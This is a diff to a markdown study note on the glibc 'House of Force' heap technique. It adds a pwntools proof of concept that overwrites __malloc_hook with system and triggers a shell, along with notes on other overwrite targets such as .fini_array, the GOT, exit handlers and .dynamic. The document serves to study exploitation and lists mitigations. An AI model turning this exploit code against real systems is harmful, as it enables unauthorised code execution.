@@ -143,7 +143,7 @@ Meaning - allocation of `0xffffffff - 0x603020 + 0x602010 - 0x20`
 The trick is to leave `0x20` bytes for next allocation. That way it will point exactly towards the target address.
 Since the lowest possible allocation for malloc is 24 bytes of data, and 8 bytes for the `size`, it yields a minimal chunk size of 32 bytes. 
 
-We *can* allocate these extra 0x20 bytes with a single `malloc`. \ 
+Note we *can* allocate these extra 0x20 bytes with a single `malloc`. \ 
 However, it will require the exploit to fill about 0xffffffff bytes, and because some of the memory regions aren't mapped (or mapped to RODATA) - it will lead to a segfault.
 
 POC code:
@@ -218,12 +218,123 @@ info(f"delta between heap & main(): 0x{delta(heap, elf.sym.main):02x}")
 io.interactive()
 ```
 
-## Further Notes
+In order to get a shell, we may either overwrite entry at the GOT / PLT, such as `printf`, with `system` address, calculated by our leaked libc value. 
+
+Another option is overwriting entries within the `_fini` array, which contains function pointers that will be called during the program's exit. 
+
+However, for `FULL RELRO` binaries, these techniques aren't possible - as these sections marked as read only. 
+
+A possible approach would be targeting a heap function pointer. 
+Since this is a relative address within the heap, there is even no need for a heap address leakage primitive. \
+However - no such pointers exist within this particular scenario. 
+
+Targeting libc seems interesting. \
+We have a libc leak. It may be possible to overwrite its PLT (which is writeable!) or `__exit_funcs` and `tls_dtor_list`, which are similar to `_fini` behavior (but protected with `Pointer Guard`). \
+Note however it isn't trivial to trigger functions within libc, from our binary execution. 
+
+A common heap technique for such cases are the `malloc hooks` family. \
+Each core function, such as `malloc, free, realloc`, have an associated hook - which is a writeable function pointer within glibc data section.
+
+The original idea behind these hooks, are to allow developers implement their own memory allocators, or collect malloc statistics. 
+
+By setting the right offsets, i got the following heap layout, right after allocating the first large chunk (before allocating the small 24-bytes chunk):
+
+```bash
+0x7ffff7dd0c00  0x00007ffff7aa1bd0      0xffff800008832419      .........$......         <-- Top chunk
+0x7ffff7dd0c10  0x0000000000000000      0x0000000000000000      ................
+```
+
+Within this snippet, `0x7ffff7dd0c10` is the address of `__malloc_hook` function pointer. \
+By default, it is initalized to `NULL` - and ignored by `malloc` calls.
+
+My idea is to overwrite this function pointer with the address of `system` from `glibc`. \
+It can be easily found, as we have leaked libc address. 
+
+Moreover, in order to call `system("/bin/sh")`, we have to set the "size" of the overwritten malloc call to an address, containing the string `/bin/sh`. 
+
+Its pretty easy - we can either write the string `/bin/sh` ourself on the heap, and set the `size` to its heap address.
+
+Another, more elegant approach is using the address of `/bin/sh` within libc as the `size` - as we have already leaked its address. 
+
+shell POC:
+
+```python
+malloc(24, b"Y"*24 + b"\xff"*8)
+
+# We want the next allocation (0x20) to reside on malloc hook. We substract the start address of top chunk in order to calculate the offset
+distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
+
+# request the large chunk
+malloc(distance, b"A")
+
+# returns the address as integer
+bin_sh = list(libc.search(b'/bin/sh'))[0]
+print(f"THE BINSH IS {bin_sh}")
+
+# override __malloc_hook with system address
+malloc(24, p64(libc.sym.system))
+
+# trigger call to system(bin_sh)
+malloc(bin_sh, b"")
+```
+
+## Advanced Techniques
+
+### Heap Target
 
 If the target address lays on the same heap as the corrupted top chunk, no need for heap address leak - as the allocation can wrap around the VA space back into the same heap. 
 
-Viable heap function pointer target would be the `__malloc_hook`.
+### malloc_hook
+
+Viable heap function pointer target would be the `malloc_hook` family.
 By overwriting this pointer with the address of `system`, then passing `/bin/sh` pointer as an allocation size, code execution would be achieved. 
+
+### .fini and .fini_array
+
+When the process terminates, this section contains the instructions that will be executed.
+
+If a shellcode would be written into the `.fini` section address, it will be executed by the system after the main function returns. \
+Note - usually the `.fini` section is just a `R-X` section, containing few instructions that will be called at the process termination.
+
+For most cases, we would like to find structures holding the pointer towards the `.fini` section - and overwrite that pointer towards a function of our wish (for example, see the `.dynamic` example).
+
+Another, more popular trick is to overwrite pointer at `.fini_array`, which is usually a writeable section. 
+
+Note that a shared object may also have initializers and finalizers within their `.init and .fini`, not only executables!
+
+Important: the linker processes its termination sections at the following order: (`.fini_array`, `.fini`). \
+Equivalent for `init` are the `.pre_initarray, .init_array, .init` sections. 
+
+### .dtors
+
+The full technique is described within the following [link][dtors-technique], which is a paper from the year of 2000.
+
+The `.ctors, .dtors` are actually legacy versions of the modern `.fini_array` - but the same idea holds. 
+
+Note they have reversed the functions execution order. 
+
+### __exit_funcs
+
+The internal implementation of `exit`, actually calls `__run_exit_handlers`. This function first issues `__call_tls_dtors`, in case it isn't a `NULL` ptr. 
+
+Apperently there is alot of info about exit handlers, i will look into this more deeply: [link1][exit-handlers], [link2][exit-handlers2], [link3][exit-handlers3], [link4][exit-handlers4], [link5][exit-handlers5], [link6][exit-handlers6], [link7][exit-handlers7], [link8][exit-handlers8], [link9][exit-handlers9], [link10][exit-handlers10].
+
+### tls_dtor_list
+
+### __call_tls_dtors
+
+### .dynamic
+
+Described [here][dynamic-technique]. \
+This section contains information about all other sections within the binary, used for dynamic linking. 
+
+For example, it contains the address of the `.fini` section. \
+That way, the linker can resolve the `.fini` address of the binary. 
+
+It means that in case the `.fini` entry within the `.dynamic` would be overwritten to certain function pointer, upon an exit - this new function pointer would be executed! 
+
+Easy-pissy. 
+
 
 ## Mitigations
 
@@ -233,3 +344,15 @@ GLIBC 2.30 adds a maximum allocation size check for malloc - limiting possible w
 
 
 [the-malloc-maleficarum]: https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt
+[dtors-technique]: https://lwn.net/2000/1214/a/sec-dtors.php3
+[dynamic-technique]: https://thibaut.sautereau.fr/2016/09/09/bypassing-aslr-overwriting-the-dynamic-section/
+[exit-handlers]: http://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html
+[exit-handlers2]: https://buffer.antifork.org/security/heap_atexit.txt
+[exit-handlers3]: https://ctftime.org/writeup/34804
+[exit-handlers4]: http://www.sis.pitt.edu/jjoshi/courses/IS2620/Fall17/Lecture4.pdf
+[exit-handlers5]: https://www.tooboat.com/?p=655
+[exit-handlers6]: https://flylib.com/books/en/1.545.1.34/1/
+[exit-handlers7]: http://images.china-pub.com/ebook3765001-3770000/3768102/ch03.pdf
+[exit-handlers8]: https://github.com/bash-c/HITCON-Training-Writeup/blob/master/writeup.md
+[exit-handlers9]: https://shotgh.tistory.com/98
+[exit-handlers10]: https://0x00sec.org/t/0x00ctf-writeup-babyheap-left/5314
